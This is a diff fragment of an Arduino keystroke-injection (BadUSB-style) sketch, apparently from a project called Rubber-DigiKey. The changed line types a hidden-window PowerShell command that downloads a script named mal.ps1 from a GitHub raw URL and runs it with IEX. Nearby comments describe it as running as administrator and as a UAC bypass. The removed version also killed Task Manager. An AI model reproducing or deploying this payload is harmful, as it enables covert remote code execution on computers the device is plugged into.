@@ -48,7 +48,7 @@ void setup() {
 
 // enter commands to be run as administrator
 //
-  Keyboard.write("powershell -windowstyle hidden -command \"taskkill /F /IM taskmgr.exe;IEX (iwr -uri \"http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/mal.ps1\" -UseBasicParsing -DisableKeepAlive);\""); 
+  Keyboard.write("powershell -windowstyle hidden -command \"IEX (iwr -uri \"http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/mal.ps1\" -UseBasicParsing -DisableKeepAlive);\""); 
   Keyboard.delay(800);
 // end UAC bypass
 //
